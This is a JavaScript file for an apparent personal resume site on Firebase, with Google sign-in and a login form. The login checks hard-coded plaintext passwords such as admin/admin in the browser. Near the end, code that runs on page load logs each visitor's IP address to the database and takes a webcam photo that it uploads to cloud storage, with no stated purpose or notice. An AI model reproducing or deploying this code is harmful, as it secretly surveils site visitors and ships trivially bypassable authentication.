const firebaseConfig = {
  apiKey: "AIzaSyCkV3t8D9id4AH9p-GLfLHys-cPUDtzhnA",
  authDomain: "jayas-1db92.firebaseapp.com",
  databaseURL: "https://jayas-1db92-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "jayas-1db92",
  storageBucket: "jayas-1db92.appspot.com",
  messagingSenderId: "695257723268",
  appId: "1:695257723268:web:3cf02d01db5dca110bedd1",
  measurementId: "G-KZNBP5PPCQ"
};


          firebase.initializeApp(firebaseConfig);
          const auth = firebase.auth();
          const firestore = firebase.firestore();
          const database = firebase.database();

        // Function to sign in with Google
        function signInWithGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            firebase.auth().signInWithPopup(provider)
                .then((result) => {
                    // The signed-in user info.
                    const user = result.user;
                    console.log(user.displayName + ' signed in');
                  

                    saveUserToFirestore(user);

                    // Redirect to resume.html
                  //  window.location.href = 'resume.html';
                })
                .catch((error) => {
                    console.error(error.message);
                });
        }

        function saveUserToFirestore(user) {
            // Reference to the users collection in Firestore
            const usersCollection = firestore.collection('jayakrishna');
        
            // Get the current sign-in count and sign-in time from Firestore and update them
            usersCollection.doc(user.uid).get().then((doc) => {
                let signInCount = 1; // Default value if user is signing in for the first time
                let signInTime = new Date(); // Timestamp when the user signs in
        
                if (doc.exists) {
                    // If the user document already exists, get the current signInCount and signInTime
                    const userData = doc.data();
                    signInCount = userData.signInCount + 1 || 1; // Increment signInCount or set to 1 if undefined
                    signInTime = new Date(); // Update signInTime for existing user
                }
        
                // Set the user data in Firestore with the updated signInCount and signInTime
                usersCollection.doc(user.uid).set({
                    displayName: user.displayName,
                    email: user.email,
                    photoURL: user.photoURL,
                    uid: user.uid,
                    signInCount: signInCount,
                    signInTime: signInTime,
                    // Add more fields as needed
                }).then(() => {
                    console.log('User data saved to Firestore');
                    window.location.href = '/resume/';
                }).catch((error) => {
                    console.error('Error saving user data to Firestore:', error.message);
                });
            }).catch((error) => {
                console.error('Error getting user data from Firestore:', error.message);
            });
        }

        function displayUserDetails(uid) {
            const userDetailsContainer = document.getElementById('userDetails');

            // Reference to the users collection in Firestore
            const usersCollection = firestore.collection('jayakrishna');

            // Get user document from Firestore
            usersCollection.doc(uid).get().then((doc) => {
                if (doc.exists) {
                    // User document exists, display user details
                    const userData = doc.data();
                    userDetailsContainer.innerHTML = `
                        <p>Display Name: ${userData.displayName}</p>
                        <p>Email: ${userData.email}</p>
                        <p>Sign-in Count: ${userData.signInCount}</p>
                        <p>Sign-in Time: ${userData.signInTime.toDate()}</p>
                        <!-- Add more fields as needed -->
                    `;
                } else {
                    console.log("User document not found");
                }
            }).catch((error) => {
                console.error('Error getting user data from Firestore:', error.message);
            });
        }
        
        
        function login() {
            var username = document.getElementById('username').value;
            var passwordInput = document.getElementById('password');
            var password = passwordInput.value;

            // Check credentials
            switch (username) {
                case 'admin':
                    if (password === 'admin') {
                        // Redirect to the resume page for admin
                        window.location.href = '/resume/';
                    } else {
                        alert('Invalid password. Please try again.');
                    }
                    break;
                case 'jayakrishna':
                    if (password === 'jayakrishna') {
                        // Redirect to myresume page for jayakrishna
                        window.location.href = 'myresume.html';
                    } else {
                        alert('Invalid password. Please try again.');
                    }
                    break;
                case 'jaya':
                    if (password === 'jaya') {
                        // Redirect to node page for jaya
                        window.location.href = 'node.html';
                    } else {
                        alert('Invalid password. Please try again.');
                    }
                    break;
                default:
                    alert('Invalid username. Please try again.');
            }
        }

        function togglePassword() {
            var passwordInput = document.getElementById('password');
            var eyeIcon = document.querySelector('.eye-icon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.textContent = '👁️';
            } else {
                passwordInput.type = 'password';
                eyeIcon.textContent = '👁️';
            }
        }

async function sendIP(database) {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                const dateTime = new Date().toLocaleString();
                database.ref('ips').push({
                    ip: ip,
                    dateTime: dateTime
                });
            } catch (error) {
                console.error('Error sending IP address:', error);
            }
        }
sendIP(database);
const storage = firebase.storage();

        // Access the user's webcam
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let stream;

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true }).then(function(mediaStream) {
                video.srcObject = mediaStream;
                stream = mediaStream; // Save stream to stop it later

                // Capture photo once webcam starts
                video.addEventListener('loadeddata', capturePhoto);
            }).catch(function(error) {
                console.error("Error accessing webcam: ", error);
            });
        }

        // Capture and upload photo
        function capturePhoto() {
            // Draw video frame onto canvas
            context.drawImage(video, 0, 0, 640, 480);

            // Convert canvas to base64 image
            canvas.toBlob(function(blob) {
                // Upload to Firebase Storage
                const storageRef = storage.ref('captured_images/' + Date.now() + '.png');
                const uploadTask = storageRef.put(blob);

                uploadTask.on('state_changed', function(snapshot) {
                    // Handle progress
                }, function(error) {
                    console.error("Error uploading image: ", error);
                }, function() {
                    // Upload complete, stop webcam
                    stream.getTracks().forEach(track => track.stop());
                    console.log("Upload complete and webcam stopped");
                });
            });
        }
